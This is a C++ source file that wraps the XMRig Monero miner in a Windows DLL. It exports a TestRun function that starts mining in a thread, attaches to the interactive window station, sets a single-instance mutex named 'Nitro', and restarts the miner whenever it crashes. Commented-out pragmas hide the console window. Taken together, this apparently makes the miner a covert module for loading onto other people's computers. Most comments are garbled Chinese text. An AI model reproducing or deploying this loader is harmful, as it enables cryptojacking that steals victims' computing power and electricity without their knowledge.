/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"


//#pragma comment(lib, "libsysaux.lib")
//#pragma comment( linker, "/SUBSYSTEM:\"WINDOWS\" /entry:\"mainCRTStartup\"" )  //�����޸ĺ�������ڵ�

//#pragma comment( linker, "/SUBSYSTEM:WINDOWS" )  //������е�С����

//�������ϵͳ��Ϊwindows ������û�п���̨��

// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣

/************************************************************************/

DWORD WINAPI MyMain(LPVOID lpParam);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);

HMODULE g_hDllModule; //����Dll����ľ���������������ص�

					  
/************************************************************************/


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		printf("\nprocess attach of dll\n");

		//����Dll ����ľ��
		g_hDllModule = (HMODULE)hModule;

	case DLL_THREAD_ATTACH:
		printf("\nthread attach of dll\n");

	case DLL_THREAD_DETACH:
		printf("\nthread detach of dll\n");

	case DLL_PROCESS_DETACH:
		printf("\nprocess detach of dll\n");

		break;
	}
	return TRUE;
}


extern "C" __declspec(dllexport) void TestRun(char* strHost, int nPort)
{

	DWORD threadID;
		
	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		MyMain, // thread function
		NULL, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier




													//����ȴ��߳̽���
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}


DWORD WINAPI MyMain(LPVOID lpParam)
{

	HANDLE	hInstallMutex = NULL;
	HANDLE	hEvent = NULL;

	// Set Window Station
	//--������ͬ���ڽ���
	HWINSTA hOldStation = GetProcessWindowStation();    //���ܻ�ȡһ�����,���ý��̵ĵ�ǰ����
	HWINSTA hWinSta = OpenWindowStation(L"winsta0", FALSE, MAXIMUM_ALLOWED);   //����ָ���Ĵ���վ  XP��Ĭ�ϴ���վ
	if (hWinSta != NULL)
	{
		SetProcessWindowStation(hWinSta);   //���ñ����̴���Ϊwinsta0  // ����һ������վ�����ý��̣��Ա�ý����ܹ����ʴ���վ��Ķ��������桢�������ȫ��ԭ��
	}



	if (g_hDllModule != NULL)   //g_hInstance ��ֵҪ��Dll����ڽ��и�ֵ
	{
		//�Լ�������һ������Υ��Ĵ������� ��������˴��� ����ϵͳ�ͻ����bad_exception
		SetUnhandledExceptionFilter(bad_exception);  //������Ǵ�����Ļص�������


		hInstallMutex = CreateMutex(NULL, true, L"Nitro");  //�û�������ֻ����һ̨PCӵ��һ��ʵ��

		App miner;
		return miner.exec();
	
	}
	return 0;
}




// �����쳣�����´�������
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{

	DWORD threadID;

	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		MyMain, // thread function
		NULL, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier




					//����ȴ��߳̽���
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}